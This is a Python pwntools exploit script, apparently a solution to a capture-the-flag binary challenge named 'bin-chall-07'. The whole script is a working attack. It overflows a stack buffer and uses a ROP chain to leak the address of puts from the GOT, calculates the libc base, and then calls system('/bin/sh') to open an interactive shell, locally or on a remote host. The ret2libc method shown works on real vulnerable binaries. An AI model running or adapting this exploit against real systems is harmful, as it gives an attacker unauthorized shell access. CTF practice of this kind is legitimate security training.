#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-07")
libc = ELF("./libc.so")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

rop = ROP(elf)

main = elf.symbols["main"]
read_got = elf.got["read"]
printf_got = elf.got["printf"]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
# pop_rdi = rop.rdi.address
ret = rop.ret.address
log.info(f"{pop_rdi=:#x}")

pad = 0x20 + 0x8

payload = b"A" * pad
payload += flat(pop_rdi, puts_got, puts_plt)
payload += flat(main)

io.sendafter(b"Input: ", payload)

leak_puts = u64(io.recv(6).ljust(8, b"\x00"))
log.info(f"{leak_puts=:#x}")

# payload = b"A" * pad
# payload += flat(pop_rdi, printf_got, puts_plt)
# payload += flat(main)
#
# io.sendafter(b"Input: ", payload)
#
# leak_printf = u64(io.recv(6).ljust(8, b"\x00"))
# log.info(f"{leak_printf=:#x}")
#
# payload = b"A" * pad
# payload += flat(pop_rdi, read_got, puts_plt)
# payload += flat(main)
#
# io.sendafter(b"Input: ", payload)
#
# leak_read = u64(io.recv(6).ljust(8, b"\x00"))
# log.info(f"{leak_read=:#x}")
#
# log.info(f"puts {leak_puts:#x} printf {leak_printf:#x} read {leak_read:#x}")

libc.address = leak_puts - libc.symbols["puts"]
log.info(f"{libc.address=:#x}")
system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

payload = b"A" * pad
payload += flat(pop_rdi, bin_sh, ret, system)

io.sendafter(b"Input: ", payload)

io.interactive()
